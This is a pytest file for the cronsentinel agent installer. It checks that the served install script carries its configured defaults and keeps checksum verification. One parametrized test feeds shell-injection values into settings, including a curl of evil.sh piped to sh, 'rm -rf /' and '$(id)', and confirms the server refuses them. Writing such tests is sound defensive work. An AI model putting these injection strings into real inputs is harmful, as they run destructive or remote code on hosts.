"""R62: the Linux agent installer served from the ingest host."""
import subprocess

import pytest
from fastapi.testclient import TestClient

from cronsentinel import agentinstall
from cronsentinel.config import settings

GOOD = {"agent_download_base": "https://github.com/acme/jobwatch/releases/download", "agent_version": "v0.2.0",
        "ingest_public_url": "https://ingest.acme.io"}


@pytest.fixture
def configured(monkeypatch):
    for k, v in GOOD.items():
        monkeypatch.setattr(settings, k, v)


@pytest.fixture
def ingest():
    from cronsentinel.ingest_main import app
    return TestClient(app)


def test_serves_the_script_with_defaults_filled_in(configured, ingest):
    r = ingest.get("/agent/install.sh")
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/x-shellscript")
    body = r.text
    assert 'DEFAULT_SERVER="https://ingest.acme.io"' in body
    assert 'DEFAULT_VERSION="v0.2.0"' in body
    assert 'DEFAULT_BASE="https://github.com/acme/jobwatch/releases/download"' in body
    assert "sha256sum -c --strict" in body                       # checksum verification is still there
    assert subprocess.run(["bash", "-n"], input=body, text=True).returncode == 0     # valid shell


def test_refuses_when_not_configured(monkeypatch, ingest):
    monkeypatch.setattr(settings, "agent_download_base", "")
    r = ingest.get("/agent/install.sh")
    assert r.status_code == 503 and "AGENT_DOWNLOAD_BASE" in r.text and "#!/" not in r.text


@pytest.mark.parametrize("key,value", [
    ("agent_download_base", 'https://x.example/"$(curl evil.sh|sh)"'),
    ("agent_download_base", "http://plain.example/agent"),
    ("agent_version", "v1; rm -rf /"),
    ("agent_version", "$(id)"),
    ("ingest_public_url", "https://ingest.acme.io/`id`"),
])
def test_values_that_could_inject_shell_are_refused(configured, monkeypatch, ingest, key, value):
    """The script runs as root: anything outside a strict pattern is refused, never written into it."""
    monkeypatch.setattr(settings, key, value)
    r = ingest.get("/agent/install.sh")
    assert r.status_code == 503 and "#!/" not in r.text


def test_install_command(configured, monkeypatch):
    assert agentinstall.install_command("csb_abc") == \
        "curl -fsSL https://ingest.acme.io/agent/install.sh | sudo bash -s -- --token csb_abc"
    monkeypatch.setattr(settings, "agent_version", "")
    assert agentinstall.install_command("csb_abc") is None and "AGENT_VERSION" in agentinstall.problem()


def test_repository_script_keeps_its_defaults_block():
    agentinstall._template.cache_clear()
    assert len(agentinstall._DEFAULTS.findall(agentinstall._template())) == 3
